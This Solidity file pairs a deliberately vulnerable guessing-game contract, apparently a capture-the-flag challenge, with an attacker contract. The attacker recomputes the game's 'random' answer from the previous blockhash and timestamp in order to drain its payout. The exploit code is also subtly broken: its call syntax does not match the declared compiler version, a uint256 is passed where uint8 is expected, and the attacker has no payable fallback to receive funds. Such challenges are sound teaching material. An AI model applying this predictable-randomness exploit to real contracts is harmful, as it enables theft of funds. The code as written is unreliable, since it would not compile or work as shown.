pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberAttacker {
    address victim;

    function GuessTheNewNumberAttacker(address _victim) {
        victim = _victim;
    }

    function attack() payable {
        require(msg.value == 1 ether);
        uint256 myAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge(victim).guess{value: 1 ether}(myAnswer);

    }
}